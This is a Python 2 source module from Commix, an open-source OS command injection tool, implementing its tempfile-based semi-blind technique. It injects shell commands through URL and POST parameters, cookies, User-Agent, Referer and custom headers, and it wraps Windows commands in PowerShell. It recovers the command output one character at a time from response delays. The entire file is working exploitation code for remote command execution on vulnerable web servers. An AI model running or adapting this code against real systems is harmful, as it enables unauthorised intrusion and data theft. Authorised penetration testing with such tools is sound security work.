#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (http://commixproject.com).
Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import json
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters

from src.core.injections.controller import checks
from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads

"""
The "tempfile-based" injection technique on semiblind OS command injection.
__Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
"""

"""
Examine the GET/POST requests
"""
def examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response):

  start = 0
  end = 0
  start = time.time()
  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    payload = urllib.quote(payload)
    target = re.sub(settings.INJECT_TAG, payload, url)
    vuln_parameter = ''.join(vuln_parameter)
    request = urllib2.Request(target)
  # Check if defined method is POST.
  else :
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    parameter = parameter.replace("+","%2B")
    # Define the POST data   
    if settings.IS_JSON == False:
      data = re.sub(settings.INJECT_TAG, payload, parameter)
      data = data.replace("+","%2B")
      request = urllib2.Request(url, data)
    else:
      payload = payload.replace("\"", "\\\"")
      data = re.sub(settings.INJECT_TAG, urllib.unquote(payload), parameter)
      try:
        data = json.loads(data, strict = False)
      except:
        pass
      request = urllib2.Request(url, json.dumps(data))

  # Check if defined extra headers.
  headers.do_check(request)
  # Get the response of the request
  response = requests.get_request_response(request)

  end  = time.time()
  how_long = int(end - start)

  return how_long

"""
Check if target host is vulnerable.
"""
def injection_test(payload, http_request_method, url):
  start = 0
  end = 0
  start = time.time()
  
  # Check if defined method is GET (Default).
  if http_request_method == "GET":    
    # Encoding non-ASCII characters payload.
    payload = urllib.quote(payload)
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
    target = re.sub(settings.INJECT_TAG, payload, url)
    request = urllib2.Request(target)
    # Check if defined extra headers.
    headers.do_check(request)
    # Get the response of the request
    response = requests.get_request_response(request)
  # Check if defined method is POST.
  else:
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    parameter = parameter.replace("+","%2B")
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter, url)
    # Define the POST data   
    if settings.IS_JSON == False:
      data = re.sub(settings.INJECT_TAG, payload, parameter)
      request = urllib2.Request(url, data)
    else:
      payload = payload.replace("\"", "\\\"")
      data = re.sub(settings.INJECT_TAG, urllib.unquote(payload), parameter)
      try:
        data = json.loads(data, strict = False)
      except:
        pass
      request = urllib2.Request(url, json.dumps(data))
    # Check if defined extra headers.
    headers.do_check(request)
    # Get the response of the request
    response = requests.get_request_response(request)

  end  = time.time()
  how_long = int(end - start)
  return how_long, vuln_parameter

"""
Check if target host is vulnerable. (Cookie-based injection)
"""
def cookie_injection_test(url, vuln_parameter, payload):
  return requests.cookie_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (User-Agent-based injection)
"""
def user_agent_injection_test(url, vuln_parameter, payload):
  return requests.user_agent_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (Referer-based injection)
"""
def referer_injection_test(url, vuln_parameter, payload):
  return requests.referer_injection(url, vuln_parameter, payload)

"""
Check if target host is vulnerable. (Custom header injection)
"""
def custom_header_injection_test(url, vuln_parameter, payload):
  return requests.custom_header_injection(url, vuln_parameter, payload)
  
"""
The main command injection exploitation.
"""
def injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
  
  if settings.TARGET_OS == "win":
    previous_cmd = cmd
    if alter_shell:
      cmd = "\"" + cmd + "\""
    else: 
      cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim()"

  if menu.options.file_write or menu.options.file_upload :
    minlen = 0
  else:
    minlen = 1

  found_chars = False
  info_msg = "Retrieving the length of execution output... "
  sys.stdout.write(settings.print_info_msg(info_msg))
  sys.stdout.flush()  
  if settings.VERBOSITY_LEVEL > 1:
    print ""
  for output_length in range(int(minlen), int(maxlen)):
    # Execute shell commands on vulnerable host.
    if alter_shell :
      payload = tfb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
    else:
      payload = tfb_payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)  
   
    # Fix prefixes / suffixes
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)

    # Whitespace fixation
    payload = re.sub(" ", whitespace, payload)

    # Check for base64 / hex encoding
    payload = checks.perform_payload_encoding(payload)

    # Check if defined "--verbose" option.
    if settings.VERBOSITY_LEVEL == 1:
      payload_msg = payload.replace("\n", "\\n") 
      sys.stdout.write("\n" + settings.print_payload(payload_msg))
    elif settings.VERBOSITY_LEVEL > 1:
      info_msg = "Generating a payload for injection..."
      print settings.print_info_msg(info_msg)
      print settings.print_payload(payload) 

    # Check if defined cookie with "INJECT_HERE" tag
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
      how_long = cookie_injection_test(url, vuln_parameter, payload)

    # Check if defined user-agent with "INJECT_HERE" tag
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
      how_long = user_agent_injection_test(url, vuln_parameter, payload)

    # Check if defined referer with "INJECT_HERE" tag
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
      how_long = referer_injection_test(url, vuln_parameter, payload)

    # Check if defined custom header with "INJECT_HERE" tag
    elif settings.CUSTOM_HEADER_INJECTION:
      how_long = custom_header_injection_test(url, vuln_parameter, payload)

    else:
      how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
    
    # Examine time-responses
    injection_check = False
    if (how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF):
      injection_check = True

    if injection_check == True:   
      if output_length > 1:
        if settings.VERBOSITY_LEVEL >= 1:
          pass
        else:
          sys.stdout.write("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL+ "]\n")
          sys.stdout.flush()
        if settings.VERBOSITY_LEVEL == 1:
          print ""
        success_msg = "Retrieved " + str(output_length) + " characters." 
        print settings.print_success_msg(success_msg)
      found_chars = True
      injection_check = False
      break

  # Proceed with the next (injection) step!
  if found_chars == True :
    if settings.TARGET_OS == "win":
      cmd = previous_cmd
    num_of_chars = output_length + 1
    check_start = 0
    check_end = 0
    check_start = time.time()
    output = []
    percent = "0.0"
    info_msg = "Grabbing the output from '" + OUTPUT_TEXTFILE + "', please wait... "
    if menu.options.verbose < 1 :
      info_msg +=  "[ " +str(percent)+ "% ]"
    elif menu.options.verbose == 1 :
      info_msg +=  ""
    else:
      info_msg +=  "\n"  
    sys.stdout.write("\r" + settings.print_info_msg(info_msg))
    sys.stdout.flush()
    for num_of_chars in range(1, int(num_of_chars)):
      if num_of_chars == 1:
        # Checks {A..Z},{a..z},{0..9},{Symbols}
        char_pool = range(65, 90) + range(96, 122)
      else:
        # Checks {a..z},{A..Z},{0..9},{Symbols}
        char_pool = range(96, 122) + range(65, 90)
      char_pool = char_pool + range(48, 57) + range(32, 48) + range(90, 96)  + range(57, 65)  + range(122, 127) 
      for ascii_char in char_pool:
        # Get the execution ouput, of shell execution.
        if alter_shell :
          payload = tfb_payloads.get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method)
        else:
          payload = tfb_payloads.get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method)
        # Fix prefixes / suffixes
        payload = parameters.prefixes(payload, prefix)
        payload = parameters.suffixes(payload, suffix)

        # Whitespace fixation
        payload = re.sub(" ", whitespace, payload)
        
        # Check for base64 / hex encoding
        payload = checks.perform_payload_encoding(payload)

        # Check if defined "--verbose" option.
        if settings.VERBOSITY_LEVEL == 1:
          payload_msg = payload.replace("\n", "\\n") 
          sys.stdout.write("\n" + settings.print_payload(payload_msg))
        elif settings.VERBOSITY_LEVEL > 1:
          info_msg = "Generating a payload for injection..."
          print settings.print_info_msg(info_msg)
          print settings.print_payload(payload) 

        # Check if defined cookie with "INJECT_HERE" tag
        if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
          how_long = cookie_injection_test(url, vuln_parameter, payload)

        # Check if defined user-agent with "INJECT_HERE" tag
        elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
          how_long = user_agent_injection_test(url, vuln_parameter, payload)

        # Check if defined referer with "INJECT_HERE" tag
        elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
          how_long = referer_injection_test(url, vuln_parameter, payload)

        # Check if defined custom header with "INJECT_HERE" tag
        elif settings.CUSTOM_HEADER_INJECTION:
          how_long = custom_header_injection_test(url, vuln_parameter, payload)

        else:
          how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)
        
        # Examine time-responses
        injection_check = False
        if (how_long >= settings.FOUND_HOW_LONG and how_long - timesec >= settings.FOUND_DIFF):
          injection_check = True
        if injection_check == True:
          if not settings.VERBOSITY_LEVEL >= 1:
            output.append(chr(ascii_char))
            percent = ((num_of_chars*100)/output_length)
            float_percent = str("{0:.1f}".format(round(((num_of_chars * 100)/(output_length * 1.0)),2))) + "%"
            if percent == 100:
              float_percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
            info_msg = "Grabbing the output from '" + OUTPUT_TEXTFILE 
            info_msg += "', please wait... [ " + float_percent + " ]"
            sys.stdout.write("\r" + settings.print_info_msg(info_msg))
            sys.stdout.flush()

          else:
            output.append(chr(ascii_char))
          injection_check = False   
          break
    check_end  = time.time()
    check_how_long = int(check_end - check_start)
    output = "".join(str(p) for p in output)

  else:
    check_start = 0
    if not settings.VERBOSITY_LEVEL >= 1:
      sys.stdout.write("[" +Fore.RED+ " FAILED " + Style.RESET_ALL+ "]")
      sys.stdout.flush() 
    else:
      print "" 
    check_how_long = 0
    output = ""

  if settings.VERBOSITY_LEVEL >= 1 and menu.options.ignore_session:
    print "" 
  return check_how_long, output

"""
False Positive check and evaluation.
"""
def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, how_long, url_time_response):

  if settings.TARGET_OS == "win":
    previous_cmd = cmd
    if alter_shell:
      cmd = "\"" + cmd + "\""
    else: 
      cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim()"

  found_chars = False
  info_msg = "Checking the reliability of the used payload "
  info_msg += "in case of a false positive result... "
  if settings.VERBOSITY_LEVEL == 1: 
    sys.stdout.write(settings.print_info_msg(info_msg))
    sys.stdout.flush()
  # Check if defined "--verbose" option.
  elif settings.VERBOSITY_LEVEL > 1:
    print settings.print_info_msg(info_msg)
  
  # Varying the sleep time.
  timesec = timesec + random.randint(1, 5)
  
  # Checking the output length of the used payload.
  for output_length in range(1, 3):
    # Execute shell commands on vulnerable host.
    if alter_shell :
      payload = tfb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
    else:
      payload = tfb_payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)

    # Fix prefixes / suffixes
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)

    # Whitespace fixation
    payload = re.sub(" ", whitespace, payload)
    
    # Check for base64 / hex encoding
    payload = checks.perform_payload_encoding(payload)

    # Check if defined "--verbose" option.
    if settings.VERBOSITY_LEVEL == 1:
      payload_msg = payload.replace("\n", "\\n") 
      sys.stdout.write("\n" + settings.print_payload(payload_msg))
    # Check if defined "--verbose" option.
    elif settings.VERBOSITY_LEVEL > 1:
      info_msg = "Generating a payload for testing the reliability of used payload..."
      print settings.print_info_msg(info_msg)
      payload_msg = payload.replace("\n", "\\n") 
      sys.stdout.write(settings.print_payload(payload_msg) + "\n")
 
    # Check if defined cookie with "INJECT_HERE" tag
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
      how_long = cookie_injection_test(url, vuln_parameter, payload)

    # Check if defined user-agent with "INJECT_HERE" tag
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
      how_long = user_agent_injection_test(url, vuln_parameter, payload)

    # Check if defined referer with "INJECT_HERE" tag
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
      how_long = referer_injection_test(url, vuln_parameter, payload)

    # Check if defined custom header with "INJECT_HERE" tag
    elif settings.CUSTOM_HEADER_INJECTION:
      how_long = custom_header_injection_test(url, vuln_parameter, payload)

    else:
      how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)

    if (how_long >= settings.FOUND_HOW_LONG) and (how_long - timesec >= settings.FOUND_DIFF):
      found_chars = True
      break

  if found_chars == True :
    if settings.TARGET_OS == "win":
      cmd = previous_cmd
    num_of_chars = output_length + 1
    check_start = 0
    check_end = 0
    check_start = time.time()
    
    output = [] 
    percent = 0
    sys.stdout.flush()

    is_valid = False
    for num_of_chars in range(1, int(num_of_chars)):
      for ascii_char in range(1, 9):
 
        # Get the execution ouput, of shell execution.
        if alter_shell:
          payload = tfb_payloads.fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method)
        else:
          payload = tfb_payloads.fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method)

        # Fix prefixes / suffixes
        payload = parameters.prefixes(payload, prefix)
        payload = parameters.suffixes(payload, suffix)        

        # Whitespace fixation
        payload = re.sub(" ", whitespace, payload)

        # Encode payload to base64 format.
        if settings.TAMPER_SCRIPTS['base64encode']:
          payload = base64.b64encode(payload)

        # Encode payload to hex format.
        elif settings.TAMPER_SCRIPTS['hexencode']:
          payload = payload.encode("hex")

        # Check if defined "--verbose" option.
        if settings.VERBOSITY_LEVEL == 1:
          payload_msg = payload.replace("\n", "\\n") 
          sys.stdout.write("\n" + settings.print_payload(payload_msg))
        # Check if defined "--verbose" option.
        elif settings.VERBOSITY_LEVEL > 1:
          info_msg = "Generating a payload for injection..."
          print settings.print_info_msg(info_msg)
          payload_msg = payload.replace("\n", "\\n") 
          sys.stdout.write(settings.print_payload(payload_msg) + "\n")

        # Check if defined cookie with "INJECT_HERE" tag
        if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
          how_long = cookie_injection_test(url, vuln_parameter, payload)

        # Check if defined user-agent with "INJECT_HERE" tag
        elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
          how_long = user_agent_injection_test(url, vuln_parameter, payload)

        # Check if defined referer with "INJECT_HERE" tag
        elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
          how_long = referer_injection_test(url, vuln_parameter, payload)

        # Check if defined custom header with "INJECT_HERE" tag
        elif settings.CUSTOM_HEADER_INJECTION:
          how_long = custom_header_injection_test(url, vuln_parameter, payload)
      
        else:
          how_long = examine_requests(payload, vuln_parameter, http_request_method, url, timesec, url_time_response)

        if (how_long >= settings.FOUND_HOW_LONG) and (how_long - timesec >= settings.FOUND_DIFF):
          output.append(ascii_char)
          is_valid = True
          break
          
      if is_valid:
          break

    check_end  = time.time()
    check_how_long = int(check_end - check_start)
    output = "".join(str(p) for p in output)

    if str(output) == str(randvcalc):
      return how_long, output

"""
Export the injection results
"""
def export_injection_results(cmd, separator, output, check_how_long):
  if output != "" and check_how_long != 0 :
    if settings.VERBOSITY_LEVEL == 0:
      print "\n"
    elif settings.VERBOSITY_LEVEL == 1:
      print ""  
    print Fore.GREEN + Style.BRIGHT + output + Style.RESET_ALL
    info_msg = "Finished in " + time.strftime('%H:%M:%S', time.gmtime(check_how_long))
    sys.stdout.write("\n" + settings.print_info_msg(info_msg))
    if not menu.options.os_cmd:
      print ""
  else:
    err_msg = "The '" + cmd + "' command, does not return any output."
    print settings.print_critical_msg(err_msg) + "\n"

#eof